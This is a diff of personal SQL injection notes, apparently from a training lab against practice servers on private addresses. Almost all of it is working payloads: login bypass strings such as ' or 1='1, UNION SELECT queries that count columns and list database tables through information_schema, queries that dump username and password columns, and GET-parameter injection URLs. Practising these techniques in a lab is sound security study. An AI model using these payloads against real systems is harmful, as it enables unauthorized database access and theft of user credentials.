@@ -26,7 +26,7 @@ not in
 
 select id from users where name='' and pass='';
 
-user: ' or 1='1
+user: ' or 1='1         #f12 network tab 
 pass: '
 
 user: tom' or 1='1
@@ -40,9 +40,9 @@ Audi' or 1='1    #try al the types at the start(audi,ford,Honda,dodge)
 Audi' UNION SELECT 1,2,3,4; #   #octothorpe is a comment which cancels out their query and just uses mine
 Audi' UNION SELECT 1,2,3,4,5; #    #same thing but testing if there is another column if last command ran an error
 
-step 1 
+step 1 find out if it's vulnerable to sql injection
 step 2 find out how many columns there are
-
+step 3 
 
 Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns; #
 
@@ -50,3 +50,20 @@ Audi ' UNION SELECT passwd,2,username,studentID,5 FROM session.userinfo; #
 Audi ' UNION SELECT passwd,2,username,4,5 FROM session.userinfo; #
 
 Audi ' UNION SELECT name,2,cost,size,tireid FROM session.Tires; #
+
+
+GET sql injection
+
+10.50.31.91/uniondemo.php?Selection=1 or 1=1;#   # one turned out not vuln
+10.50.31.91/uniondemo.php?Selection2=1 or 1=1;#   #two turned out vuln
+http://10.50.31.91/uniondemo.php?Selection=2%20UNION%20SELECT%201,2,3;#
+
+http://10.50.31.91/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;#
+
+http://10.50.31.91/uniondemo.php?Selection=2 UNION SELECT id,pass,name FROM session.user;#
+
+
+http://127.0.0.1:11103/net_test/industry_check.php
+
+http://127.0.0.1:11103/cases/productsCategory.php?category=1 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; #
+http://127.0.0.1:11103/cases/productsCategory.php?category=1 UNION SELECT comment,mime,data FROM sqlinjection.share4; #
